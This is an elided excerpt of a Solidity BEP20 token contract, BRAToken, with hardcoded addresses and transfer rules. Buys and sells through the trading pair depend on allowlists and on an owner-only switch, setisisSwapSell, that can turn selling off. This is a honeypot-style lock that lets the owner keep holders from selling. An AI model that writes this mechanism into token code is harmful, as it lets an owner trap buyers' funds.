...
contract BEP20 is Context, Ownable, IBEP20{
    ...
    address public BRA = 0xB0d46bcd79Dae24DeE801C29017c00496248b599; //kyle
    ...
    function _transfer(address sender, address recipient, uint amount) internal {
        ...
        if(sender==uniswapV2Pair&&!isAllow[recipient]){
            require(isSwapAndLiquid,"BEP20: buy is not allow");
        }

        if(recipient==uniswapV2Pair&&!isAllowSell[sender]){
            require(isSwapSell,"BEP20: sell is not allow");
        }
...
contract BRAToken is BEP20Detailed {
    ...
    address constant  private A = 0x8fdd463A9bBa1cf78Bb6A2Ae07094B19331CC8E4;
    address constant  private B = 0x571c395298029FDb74A69870343710CCAE0e5585;
    ...
    function setisisSwapSell(bool res) external onlyOwner {
        isSwapSell = res;
    }
